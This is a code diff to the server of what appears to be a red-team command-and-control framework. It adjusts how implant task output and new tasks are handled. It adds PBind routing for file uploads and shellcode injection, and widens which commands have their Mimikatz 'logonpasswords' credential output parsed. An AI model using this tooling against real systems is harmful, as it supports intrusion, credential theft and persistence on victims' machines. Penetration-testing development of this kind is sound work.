@@ -49,7 +49,7 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                     taskId = str(int(splt[0]))
                     cookieMsg = splt[1]
             else:
-                taskId = str(int(decCookie.strip('\x00')))                
+                taskId = str(int(decCookie.strip('\x00')))
             taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
             if taskId != "99999":
                 executedCmd = DB.get_cmd_from_task_id(taskId)
@@ -59,7 +59,7 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                 timenow = now.strftime("%d/%m/%Y %H:%M:%S")
                 print(f"Background task against implant {implantID} on host {Domain}\\{User} @ {Hostname} ({timenow}) (output appended to %sbackground-data.txt)" % ReportsDirectory)
                 print(Colours.GREEN)
-                print(rawoutput)                        
+                print(rawoutput)
                 miscData = open(("%sbackground-data.txt" % ReportsDirectory), "a+")
                 miscData.write(rawoutput)
                 return
@@ -75,7 +75,7 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                 pass
             if cookieMsg is not None and cookieMsg.lower().startswith("pwrstatusmsg"):
                 translate_power_status(outputParsed, RandomURI)
-                return 
+                return
             if "loadmodule" in executedCmd:
                 print("Module loaded successfully")
                 DB.update_task(taskId, "Module loaded successfully")
@@ -86,11 +86,11 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                 Proxy = Proxy.replace("\x00", "")
                 if "\\" in User:
                     User = User[User.index("\\") + 1:]
-                newImplant = Implant(implantID, "C# PBind", str(Domain), str(User), str(Hostname), Arch, PID, "PBind")
+                newImplant = Implant(implantID, "C# PBind", str(Domain), str(User), str(Hostname), Arch, PID, None)
                 newImplant.save()
                 newImplant.display()
-                newImplant.autoruns()         
-                DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)      
+                newImplant.autoruns()
+                DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
             elif executedCmd.lower().startswith("beacon "):
                 new_sleep = executedCmd.replace('beacon ', '').strip()
                 DB.update_sleep(new_sleep, RandomURI)
@@ -203,8 +203,8 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                     DB.update_task(taskId, message)
                     print(message)
 
-            elif (executedCmd.lower().startswith("run-exe safetykatz") or "invoke-mimikatz" in executedCmd or executedCmd.lower().startswith("pbind-command")) and "logonpasswords" in outputParsed.lower():
-                print("Parsing Mimikatz Output")                
+            elif (executedCmd.lower().startswith("run-exe safetykatz") or "invoke-mimikatz" in executedCmd or executedCmd.lower().startswith("pbind-command") or executedCmd.lower().startswith("run-dll sharpsploit")) and "logonpasswords" in outputParsed.lower():
+                print("Parsing Mimikatz Output")
                 DB.update_task(taskId, outputParsed)
                 process_mimikatz(outputParsed)
                 print(Colours.GREEN)
@@ -232,11 +232,16 @@ def newTask(path):
                     implant = DB.get_implantbyrandomuri(RandomURI)
                     implant_type = DB.get_implanttype(RandomURI)
                     now = datetime.datetime.now()
-                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
+                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode")  or command.lower().startswith("run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
                         user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                         command = command[:command.index("#")]
-                    elif (command.lower().startswith('upload-file')):
-                        upload_args = command.replace('upload-file', '')
+                    elif (command.lower().startswith('upload-file') or command.lower().startswith('pbind-command upload-file')):
+                        PBind = False
+                        if command.lower().startswith('pbind-command upload-file'):
+                            PBind = True
+                        upload_args = command \
+                            .replace('pbind-command upload-file', '') \
+                            .replace('upload-file', '')
                         upload_file = upload_args.split()[0]
                         try:
                             upload_file_destination = upload_args.split()[1]
@@ -263,6 +268,8 @@ def newTask(path):
                             print(Colours.RED)
                             print("Error parsing upload command: %s" % upload_args)
                             print(Colours.GREEN)
+                        if PBind:
+                            command = f"pbind-command {command}"
                         filehash = hashlib.md5(base64.b64decode(upload_file_bytes_b64)).hexdigest()
                         user_command = f"Uploading file: {upload_file} to {upload_file_destination} with md5sum: {filehash}"
                     taskId = DB.insert_task(RandomURI, user_command, user)
@@ -313,7 +320,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()                            
+                            traceback.print_exc()
                     elif task[2].startswith("pslo "):
                         try:
                             module_name = (task[2]).replace("pslo ", "")
@@ -337,7 +344,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot find module, loadmodule is case sensitive!")
                             print(e)
-                            traceback.print_exc()                            
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-loadmodule "):
                         try:
                             module_name = (task[2]).replace("pbind-loadmodule ", "")
